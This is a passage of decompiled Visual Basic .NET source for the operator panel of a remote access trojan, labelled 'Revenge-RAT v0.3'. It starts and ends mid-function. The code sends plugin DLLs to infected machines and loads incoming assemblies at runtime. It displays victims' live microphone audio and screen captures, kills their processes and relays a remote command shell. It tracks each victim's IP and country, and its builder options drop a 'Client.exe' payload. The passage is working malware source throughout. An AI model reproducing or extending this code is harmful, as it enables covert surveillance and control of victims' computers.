                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "PA", Me.Key, "PA", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\PA.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "KE") AndAlso File.Exists((Application.StartupPath & "\Plugin\KE.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "KE", Me.Key, "KE", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\KE.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "SI") AndAlso File.Exists((Application.StartupPath & "\Plugin\SI.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "SI", Me.Key, "SI", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\SI.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "PW") AndAlso File.Exists((Application.StartupPath & "\Plugin\PW.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "PW", Me.Key, "PW", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\PW.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "SP") AndAlso File.Exists((Application.StartupPath & "\Plugin\SP.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "SP", Me.Key, "SP", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\SP.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "SC") AndAlso File.Exists((Application.StartupPath & "\Plugin\SC.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "SC", Me.Key, "SC", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\SC.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "TS") AndAlso File.Exists((Application.StartupPath & "\Plugin\TS.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "TS", Me.Key, "TS", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\TS.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "CH") AndAlso File.Exists((Application.StartupPath & "\Plugin\CH.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "CH", Me.Key, "CH", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\CH.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "MC") AndAlso File.Exists((Application.StartupPath & "\Plugin\MC.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "MC", Me.Key, "MC", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\MC.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "SPC") AndAlso File.Exists((Application.StartupPath & "\Plugin\MC.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "SPC", Me.Key, "SPC", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\SPC.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    Me.TD(sock)
                    Return
                Case "OPFAI"
                    If Me.InvokeRequired Then
                        Dim _data33 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data33, New Object() {sock, b})
                    Else
                        Try
                            Dim obj8 As Object = RuntimeHelpers.GetObjectValue(Assembly.Load(SocketServer.Decompress(Convert.FromBase64String(strArray(1)))).CreateInstance((strArray(2) & "." & strArray(3)), True))
                            NewLateBinding.LateSet(obj8, Nothing, "Sock", New Object() {sock}, Nothing, Nothing)
                            NewLateBinding.LateSet(obj8, Nothing, "Name", New Object() {(strArray(3) & Conversions.ToString(sock))}, Nothing, Nothing)
                            NewLateBinding.LateCall(obj8, Nothing, "Show", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                        Catch exception84 As Exception
                            ProjectData.SetProjectError(exception84)
                            Dim exception3 As Exception = exception84
                            MessageBox.Show(exception3.Message.ToString)
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Return
                Case "RDPIF"
                    If Me.InvokeRequired Then
                        Dim _data34 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data34, New Object() {sock, b})
                    Else
                        objArray2 = New Object(1 - 1) {}
                        Dim strArray45 As String() = strArray
                        num52 = 2
                        objArray2(0) = strArray45(num52)
                        objArray = objArray2
                        flagArray = New Boolean() {True}
                        NewLateBinding.LateCall(PLU.PassDataToFormByName((strArray(1) & Conversions.ToString(sock))), Nothing, "Receive", objArray, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            strArray45(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                        End If
                    End If
                    Return
                Case "TS"
                    Dim item51 As ListViewItem
                    Dim enumerator36 As IEnumerator
                    Dim seeder As Torrent_Seeder = DirectCast(My.Application.OpenForms.Item("TSF"), Torrent_Seeder)
                    Dim strArray38 As String() = Strings.Split(strArray(2), "|", -1, CompareMethod.Binary)
                    Try
                        enumerator36 = seeder.Clients.Items.GetEnumerator
                        Do While enumerator36.MoveNext
                            Dim item52 As ListViewItem = DirectCast(enumerator36.Current, ListViewItem)
                            If Operators.ConditionalCompareObjectEqual(item52.SubItems.Item(0).Text, Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " / "), Me.s.IP(sock)), False) Then
                                Return
                            End If
                        Loop
                    Finally
                    End Try
                    If ((strArray38(0) = "True") And (strArray38(1) = "True")) Then
                        item51 = seeder.Clients.Items.Add(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " / "), Me.s.IP(sock))), 0)
                        item51.ForeColor = Color.Green
                        item51.SubItems.Add(("uTorrent : " & strArray38(0) & " | BitTorrent : " & strArray38(1)))
                        item51.ToolTipText = Conversions.ToString(sock)
                        item51.Tag = strArray(3)
                    ElseIf ((strArray38(0) = "False") And (strArray38(1) = "False")) Then
                        item51 = seeder.Clients.Items.Add(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " / "), Me.s.IP(sock))), 0)
                        item51.ForeColor = Color.Red
                        item51.SubItems.Add(("uTorrent : " & strArray38(0) & " | BitTorrent : " & strArray38(1)))
                        item51.ToolTipText = Conversions.ToString(sock)
                        item51.Tag = strArray(3)
                    Else
                        item51 = seeder.Clients.Items.Add(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " / "), Me.s.IP(sock))), 0)
                        item51.ForeColor = Color.Orange
                        item51.SubItems.Add(("uTorrent : " & strArray38(0) & " | BitTorrent : " & strArray38(1)))
                        item51.ToolTipText = Conversions.ToString(sock)
                        item51.Tag = strArray(3)
                    End If
                    item51 = DirectCast(NewLateBinding.LateGet(seeder.CLogs.Items, Nothing, "Add", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject(("[" & Conversions.ToString(DateAndTime.Now) & "] - "), SocketServer.Decode(strArray(1))), " : Connected")}, Nothing, Nothing, Nothing), ListViewItem)
                    item51.ForeColor = Color.Green
                    Return
                Case "Torrent Status"
                    Dim item53 As ListViewItem
                    Dim seeder2 As Torrent_Seeder = DirectCast(My.Application.OpenForms.Item("TSF"), Torrent_Seeder)
                    If (strArray(1) = "seeded successfully") Then
                        item53 = DirectCast(NewLateBinding.LateGet(seeder2.CLogs.Items, Nothing, "Add", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("[" & Conversions.ToString(DateAndTime.Now) & "] - "), SocketServer.Decode(strArray(2))), " : "), strArray(3)), " "), strArray(1))}, Nothing, Nothing, Nothing), ListViewItem)
                        item53.ForeColor = Color.Green
                    End If
                    If (strArray(1) = "unseeded successfully") Then
                        item53 = DirectCast(NewLateBinding.LateGet(seeder2.CLogs.Items, Nothing, "Add", New Object() {Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("[" & Conversions.ToString(DateAndTime.Now) & "] - "), SocketServer.Decode(strArray(2))), " : "), strArray(3)), " "), strArray(1))}, Nothing, Nothing, Nothing), ListViewItem)
                        item53.ForeColor = Color.Red
                    End If
                    Return
                Case "OCF"
                    If (Not My.Application.OpenForms.Item(("OPC" & strArray(3))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                    ElseIf (Not My.Application.OpenForms.Item(("Chat" & strArray(3))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                    ElseIf Me.InvokeRequired Then
                        Dim _data35 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data35, New Object() {sock, b})
                    Else
                        Dim ch_op As New CH_OP
                        ch_op.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Chat Settings : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        ch_op.Sock = sock
                        ch_op.Name = ("OPC" & strArray(3))
                        ch_op.OS = Conversions.ToInteger(strArray(3))
                        ch_op.Devices = RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))
                        ch_op.FTT = Conversions.ToString(SocketServer.Decode(strArray(1)))
                        ch_op.ShowDialog()
                    End If
                    Return
                Case "ET"
                    Dim ch As CH = DirectCast(My.Application.OpenForms.Item(("Chat" & strArray(1))), CH)
                    ch.AT(ch.ClinetColor, Conversions.ToString(SocketServer.Decode(ch.CID)), Conversions.ToString(SocketServer.Decode(strArray(2))))
                    Return
                Case "PC"
                    Dim ch2 As CH = DirectCast(My.Application.OpenForms.Item(("Chat" & strArray(1))), CH)
                    ch2.AT(Color.Red, Conversions.ToString(SocketServer.Decode(ch2.CID)), "Buzz!!")
                    Dim location As Point = ch2.Location
                    Dim size As New Size(ch2.Location.X, location.Y)
                    location = New Point((size.Width - 3), (size.Height + 3))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point((size.Width + 3), (size.Height - 3))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point((size.Width - 5), (size.Height + 5))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point((size.Width + 5), (size.Height - 5))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point((size.Width - 8), (size.Height + 8))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point((size.Width + 8), (size.Height - 8))
                    ch2.Location = location
                    Thread.Sleep(10)
                    location = New Point(size.Width, size.Height)
                    ch2.Location = location
                    Return
                Case "CWC"
                    Dim ch3 As CH = DirectCast(My.Application.OpenForms.Item(("Chat" & strArray(2))), CH)
                    ch3.Pic.Image = New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(1)))))
                    Return
                Case "IsTyping"
                    Dim ch4 As CH = DirectCast(My.Application.OpenForms.Item(("Chat" & strArray(1))), CH)
                    If Conversions.ToBoolean(strArray(2)) Then
                        ch4.Label2.Text = ch4.OLDStatus
                    ElseIf (ch4.B = 0) Then
                        ch4.B = 1
                        ch4.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Status : ", SocketServer.Decode(ch4.CID)), " typing ."))
                    ElseIf (ch4.B = 1) Then
                        ch4.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Status : ", SocketServer.Decode(ch4.CID)), " typing .."))
                        ch4.B = 2
                    ElseIf (ch4.B = 2) Then
                        ch4.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Status : ", SocketServer.Decode(ch4.CID)), " typing ..."))
                        ch4.B = 0
                    End If
                    Return
                Case "OMICForm"
                    If (Not My.Application.OpenForms.Item(("OMICForm" & strArray(3))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                    ElseIf Me.InvokeRequired Then
                        Dim _data36 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data36, New Object() {sock, b})
                    Else
                        Dim microphone As New Microphone
                        microphone.sock = sock
                        microphone.Name = ("OMICForm" & strArray(3))
                        microphone.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Audio Feed : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        Dim strArray39 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "|", -1, CompareMethod.Binary)
                        Dim num82 As Integer = (strArray39.Length - 2)
                        Dim num45 As Integer = 0
                        Do While (num45 <= num82)
                            microphone.DV.Items.Add(strArray39(num45))
                            num45 += 1
                        Loop
                        microphone.DV.SelectedIndex = 0
                        microphone.BZ.SelectedIndex = 3
                        microphone.CT.SelectedIndex = 0
                        microphone.Show()
                    End If
                    Return
                Case "Audio Feed"
                    DirectCast(My.Application.OpenForms.Item(("OMICForm" & strArray(2))), Microphone).RS(Encoding.Default.GetBytes(strArray(1)))
                    Return
                Case "SPC"
                    If (Not My.Application.OpenForms.Item(("SPC" & strArray(3))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                    ElseIf Me.InvokeRequired Then
                        Dim _data37 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data37, New Object() {sock, b})
                    Else
                        Dim control As New Speed_Control
                        control.Sock = sock
                        control.Name = ("SPC" & strArray(3))
                        control.Text = String.Concat(New String() {"Speed Control : [ ", "ID , ".Replace("ID", Conversions.ToString(SocketServer.Decode(strArray(1)))), " @Machine , ", "IP".Replace("IP", Me.s.IP(sock)), " ] - Revenge-RAT v0.3"})
                        control.Info = strArray(2)
                        Try
                            Dim strArray40 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(4))), "|__|", -1, CompareMethod.Binary)
                            Dim num83 As Integer = (strArray40.Length - 2)
                            Dim num46 As Integer = 0
                            Do While (num46 <= num83)
                                control.ComboBox1.Items.Add(String.Concat(New String() {strArray40(num46), " - ", strArray40((num46 + 1)), " - ", strArray40((num46 + 2))}))
                                num46 = (num46 + 2)
                                num46 += 1
                            Loop
                        Catch exception85 As Exception
                            ProjectData.SetProjectError(exception85)
                            ProjectData.ClearProjectError()
                        End Try
                        control.Path = Conversions.ToString(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))))
                        control.Show()
                    End If
                    Return
                Case "GINFO"
                    If Me.InvokeRequired Then
                        Dim _data38 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data38, New Object() {sock, b})
                    Else
                        Dim control2 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(2))), Speed_Control)
                        Try
                            control2.Enterr(strArray(1))
                        Catch exception86 As Exception
                        End Try
                        control2.ToolStripStatusLabel1.Text = "List of information successfully created"
                        control2.Fxlsv1.Enabled = True
                    End If
                    Return
            End Select
            If (str13 = "GDFD") Then
                If Me.InvokeRequired Then
                    Dim _data39 As _data = New _data(AddressOf Me.data)
                    Me.Invoke(_data39, New Object() {sock, b})
                Else
                    Dim control3 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(3))), Speed_Control)
                    control3.ImageList3.Images.Clear()
                    control3.ImageList3.Images.Add(My.Resources._1480588346_folder)
                    If (control3.Label1.Text.Length > 3) Then
                        Dim item54 As ListViewItem = control3.Fxlsv2.Items.Add("...", 0)
                        item54.SubItems.Add("...")
                        item54.SubItems.Add("...")
                    End If
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(SocketServer.Decode(strArray(2)), "Bla", False))) Then
                        Dim strArray41 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "*_*", -1, CompareMethod.Binary)
                        Dim num84 As Integer = (strArray41.Length - 2)
                        Dim num47 As Integer = 0
                        Do While (num47 <= num84)
                            Dim item55 As ListViewItem = control3.Fxlsv2.Items.Add(strArray41(num47), 0)
                            item55.SubItems.Add(strArray41((num47 + 1)))
                            item55.SubItems.Add(strArray41((num47 + 2)))
                            num47 = (num47 + 2)
                            num47 += 1
                        Loop
                    End If
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(SocketServer.Decode(strArray(1)), "Bla", False))) Then
                        Dim strArray42 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(1))), "*_*", -1, CompareMethod.Binary)
                        Try
                            Dim num85 As Integer = (strArray42.Length - 2)
                            Dim num48 As Integer = 0
                            Do While (num48 <= num85)
                                control3.ImageList3.Images.Add(strArray42(num48), New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray42((num48 + 3)))))))
                                Dim item56 As ListViewItem = control3.Fxlsv2.Items.Add(strArray42(num48), strArray42(num48), strArray42(num48))
                                item56.SubItems.Add(SocketServer.GetSize(Conversions.ToULong(strArray42((num48 + 1)))))
                                item56.SubItems.Add(strArray42((num48 + 2)))
                                num48 = (num48 + 3)
                                num48 += 1
                            Loop
                        Catch exception87 As Exception
                            ProjectData.SetProjectError(exception87)
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    control3.ToolStripStatusLabel1.Text = "List of files successfully created"
                    control3.Fxlsv2.Enabled = True
                    control3.ComboBox1.Enabled = True
                    control3.Fxlsv2.AutoResizeColumn(2, ColumnHeaderAutoResizeStyle.HeaderSize)
                    control3.Fxlsv2.AutoResizeColumn(1, ColumnHeaderAutoResizeStyle.HeaderSize)
                End If
            Else
                Select Case str13
                    Case "RunResult"
                        Dim control4 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(3))), Speed_Control)
                        control4.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject(strArray(1), SocketServer.Decode(strArray(2))))
                        If (strArray(1) = "Killed Successfully : ") Then
                            Dim enumerator37 As IEnumerator
                            Try
                                enumerator37 = control4.Fxlsv3.Items.GetEnumerator
                                Do While enumerator37.MoveNext
                                    Dim item57 As ListViewItem = DirectCast(enumerator37.Current, ListViewItem)
                                    If Operators.ConditionalCompareObjectEqual(item57.SubItems.Item(1).Text, SocketServer.Decode(strArray(2)), False) Then
                                        item57.Remove()
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                        Return
                    Case "PRMS"
                        If Me.InvokeRequired Then
                            Dim _data40 As _data = New _data(AddressOf Me.data)
                            Me.Invoke(_data40, New Object() {sock, b})
                        Else
                            Dim control5 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(3))), Speed_Control)
                            control5.ImageList4.Images.Clear()
                            control5.ImageList4.Images.Add("Default", New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(1))))))
                            Dim strArray43 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "|_|", -1, CompareMethod.Binary)
                            Dim num86 As Integer = (strArray43.Length - 2)
                            Dim num49 As Integer = 0
                            Do While (num49 <= num86)
                                Dim imageKey As String = "Default"
                                If (strArray43((num49 + 4)) = "-") Then
                                    imageKey = "Default"
                                Else
                                    control5.ImageList4.Images.Add(strArray43(num49), New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray43((num49 + 4)))))))
                                    imageKey = strArray43(num49)
                                End If
                                Dim item58 As ListViewItem = control5.Fxlsv3.Items.Add(strArray43(num49), strArray43(num49), imageKey)
                                item58.SubItems.Add(strArray43((num49 + 1)))
                                item58.SubItems.Add(strArray43((num49 + 2)))
                                item58.SubItems.Add(strArray43((num49 + 3)))
                                num49 = (num49 + 4)
                                num49 += 1
                            Loop
                            control5.Fxlsv3.Enabled = True
                            control5.ToolStripStatusLabel1.Text = "List of Processes successfully created"
                            control5.Fxlsv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        End If
                        Return
                    Case "RHS"
                        Dim control6 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(2))), Speed_Control)
                        control6.TextBox1.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                        control6.Button1.Text = "Update"
                        control6.Button1.Enabled = True
                        control6.TextBox1.Enabled = True
                        Return
                    Case "RDP"
                        Dim control7 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(2))), Speed_Control)
                        If (control7.Button2.Text = "Stop") Then
                            Dim buffer6 As Byte() = Encoding.Default.GetBytes(strArray(1))
                            control7.PictureBox1.Image = New Bitmap(Image.FromStream(New MemoryStream(buffer6)))
                            control7.TabPage5.Text = ("Screen Capture : [ " & SocketServer.GetSize(CULng(buffer6.Length)) & " ] ")
                        End If
                        Return
                    Case "WLRS"
                        Dim control8 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(2))), Speed_Control)
                        control8.ResultCMD.AppendText((Functions.DEB(strArray(1)) & ChrW(13) & ChrW(10)))
                        Exit Select
                    Case "WTX"
                        Dim control9 As Speed_Control = DirectCast(My.Application.OpenForms.Item(("SPC" & strArray(2))), Speed_Control)
                        control9.TextBox2.AppendText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("User : ", SocketServer.Decode(strArray(1))), ChrW(13) & ChrW(10))))
                        Exit Select
                End Select
            End If
        Catch exception88 As Exception
        End Try
    End Sub

    Private Sub DESKTOPSHORTCUTPATH_Click(sender As Object, e As EventArgs) Handles DESKTOPSHORTCUTPATH.Click
        Me.DESKTOPSHORTCUTPATH.Text = Me.RandomVariable(5, 12)
    End Sub

    Private Sub DF_CheckedChanged(sender As Object, e As EventArgs) Handles DF.CheckedChanged
        If (Me.DropPathCombo.SelectedIndex = -1) Then
            Me.DropPathCombo.SelectedIndex = 0
            Me.DN.Text = "Client.exe"
        End If
        If (Me.DN.Text = Nothing) Then
            Me.DN.Text = "Client.exe"
        End If
        Me.DropPathCombo.Enabled = Me.DF.Checked
        Me.DN.Enabled = Me.DF.Checked
        If Not Me.DF.Checked Then
            Me.PictureBox3.Visible = False
        End If
    End Sub
    Public Sub disconnected(ByVal sock As Integer)
        Dim text As String = String.Empty
        Try
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (Conversions.ToDouble(current.ToolTipText) = sock) Then
                        Dim imageIndex As Integer = Me.ImageList3.Images.IndexOfKey((Me.GeoIP.LookupCountryName(Me.s.IP(sock)) & ".png"))
                        Dim item2 As ListViewItem = Me.Logs.Items.Add(sock.ToString, String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(sock), " - Server ID : ", current.SubItems.Item(1).Text}), imageIndex)
                        item2.ForeColor = Color.Red
                        item2.SubItems.Add("Offline")
                        item2.ForeColor = Color.Red
                        item2.ToolTipText = (Me.GeoIP.LookupCountryName(Me.s.IP(sock)) & ".png")
                        current.Remove()
                        [text] = current.SubItems.Item(1).Text
                    End If
                Loop
            Finally
            End Try
        Catch exception1 As Exception
        End Try
        Try
            Me.s.Disconnect(sock)
        Catch exception2 As Exception
        End Try
        Try
            Dim enumerator2 As IEnumerator
            Try
                enumerator2 = Me.TH.Items.GetEnumerator
                Do While enumerator2.MoveNext
                    Dim item3 As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                    If (Conversions.ToDouble(item3.ToolTipText) = sock) Then
                        item3.Remove()
                    End If
                Loop
            Finally
            End Try
        Catch exception3 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("Pastime" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("Pastime" & Conversions.ToString(sock))).Close()
            End If
        Catch exception4 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("OpenScript" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("OpenScript" & Conversions.ToString(sock))).Close()
            End If
        Catch exception5 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("System Information" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("System Information" & Conversions.ToString(sock))).Close()
            End If
        Catch exception6 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("OMICForm" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("OMICForm" & Conversions.ToString(sock))).Close()
            End If
        Catch exception7 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("System Manager" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("System Manager" & Conversions.ToString(sock))).Close()
            End If
        Catch exception8 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("OpenFileManager" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("OpenFileManager" & Conversions.ToString(sock))).Close()
            End If
        Catch exception9 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("Process Properties" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("Process Properties" & Conversions.ToString(sock))).Close()
            End If
        Catch exception10 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("OPC" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("OPC" & Conversions.ToString(sock))).Close()
            End If
        Catch exception11 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("CP" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("CP" & Conversions.ToString(sock))).Close()
            End If
        Catch exception12 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("Chat" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("Chat" & Conversions.ToString(sock))).Close()
            End If
        Catch exception13 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("WCV" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("WCV" & Conversions.ToString(sock))).Close()
            End If
        Catch exception14 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item(("SPC" & Conversions.ToString(sock))) Is Nothing) Then
                My.Application.OpenForms.Item(("SPC" & Conversions.ToString(sock))).Close()
            End If
        Catch exception15 As Exception
        End Try
        Try
            If (Not My.Application.OpenForms.Item("TSF") Is Nothing) Then
                Dim enumerator3 As IEnumerator
                Dim seeder As Torrent_Seeder = DirectCast(My.Application.OpenForms.Item("TSF"), Torrent_Seeder)
                Try
                    enumerator3 = seeder.Clients.Items.GetEnumerator
                    Do While enumerator3.MoveNext
                        Dim item4 As ListViewItem = DirectCast(enumerator3.Current, ListViewItem)
                        If Operators.ConditionalCompareObjectEqual(item4.Tag, sock, False) Then
                            item4.Remove()
                            seeder.CLogs.Items.Add(String.Concat(New String() {"[", Conversions.ToString(DateAndTime.Now), "] - ", [text], " : Disconnected"})).ForeColor = Color.Red
                            If (seeder.Clients.Items.Count = 0) Then
                                seeder.Close()
                            End If
                            Return
                        End If
                    Loop
                Finally
                End Try
            End If
        Catch exception16 As Exception
        End Try
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Listview1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Me.disconnected(Conversions.ToInteger(current.ToolTipText))
            Loop
        Finally
        End Try
    End Sub

    Private Sub DisplayToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisplayToolStripMenuItem.Click
        Me.Visible = True
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Sub DLCB_SelectedIndexChanged(sender As Object, e As EventArgs) Handles DLCB.SelectedIndexChanged
        Try
            Me.LGF.Items.Clear()
            Dim str As String
            For Each str In Directory.GetFiles(("Database\" & Me.DLCB.Items.Item(Me.DLCB.SelectedIndex).ToString))
                Me.LGF.Items.Add(Path.GetFileNameWithoutExtension(str)).ToolTipText = str
            Next
            Me.ToolStripStatusLabel14.Text = (Me.DLCB.Items.Item(Me.DLCB.SelectedIndex).ToString & " database loaded successfully")
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub DropPathCombo_SelectedIndexChanged(sender As Object, e As EventArgs) Handles DropPathCombo.SelectedIndexChanged
        Try
            If (Me.DropPathCombo.SelectedIndex = 4) Then
                Me.PictureBox3.Visible = True
            Else
                Me.PictureBox3.Visible = False
            End If
        Catch exception1 As Exception
        End Try
    End Sub
    Public Sub DW()
        Dim str As String
        Dim enumerator As IEnumerator
        Dim num As Integer = 0
        Try
            enumerator = Me.Listview1.Items.GetEnumerator
